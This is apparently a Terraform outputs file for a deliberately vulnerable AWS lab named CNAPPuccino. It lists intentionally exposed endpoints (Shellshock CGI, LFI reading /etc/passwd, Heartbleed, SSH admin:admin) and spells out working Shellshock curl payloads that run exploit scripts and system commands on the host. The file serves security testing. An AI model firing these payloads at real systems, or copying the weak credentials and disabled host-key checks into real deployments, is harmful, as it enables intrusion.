output "public_ip" {
  description = "Public IP address of the CNAPPuccino instance"
  value       = aws_eip.lab_ip.public_ip
}

output "instance_id" {
  description = "EC2 instance ID"
  value       = aws_instance.host.id
}

output "security_group_id" {
  description = "Security group ID"
  value       = aws_security_group.ec2.id
}

output "ssh_command" {
  description = "SSH command to connect to the instance"
  value       = "ssh -i ${replace(abspath("${path.module}/../cnappuccino-state/cnappuccino-key"), "\\", "\\\\")} -o StrictHostKeyChecking=no ubuntu@${aws_eip.lab_ip.public_ip}"
}

output "vulnerable_endpoints" {
  description = "List of vulnerable endpoints for testing"
  value = {
    "Apache_CGI_Shellshock"     = "http://${aws_eip.lab_ip.public_ip}/cgi-bin/exec.cgi"
    "PHP_Upload"                = "http://${aws_eip.lab_ip.public_ip}/upload.php"
    "PHP_LFI"                   = "http://${aws_eip.lab_ip.public_ip}/view.php?file=/etc/passwd"
    "Nginx_Directory_Listing"   = "http://${aws_eip.lab_ip.public_ip}:8080/secret/"
    "Heartbleed_SSL"           = "https://${aws_eip.lab_ip.public_ip}:8443"
    "SSH_Weak_Creds"           = "ssh://admin:admin@${aws_eip.lab_ip.public_ip}:22"
  }
}

output "rce_test_commands" {
  description = "Commands to test RCE vectors"
  value = {
    "Execute_Heartbleed_Script" = "curl -H \"User-Agent: () { :; }; python3 /opt/cnappuccino/exploits/heartbleed.py ${aws_eip.lab_ip.public_ip} 8443\" http://${aws_eip.lab_ip.public_ip}/cgi-bin/exec.cgi"
    "Execute_Shellshock_Script" = "curl -H \"User-Agent: () { :; }; /bin/bash /opt/cnappuccino/exploits/shellshock.sh ${aws_eip.lab_ip.public_ip}\" http://${aws_eip.lab_ip.public_ip}/cgi-bin/exec.cgi"
    "Basic_RCE_Test"           = "curl -H \"User-Agent: () { :; }; echo 'SHELLSHOCK_RCE_EXPLOIT_CVE-2014-6271' && echo 'MITRE_T1059.004_T1190' && echo 'OWASP_A06-2021' && whoami && id && uname -a\" http://${aws_eip.lab_ip.public_ip}/cgi-bin/exec.cgi"
  }
}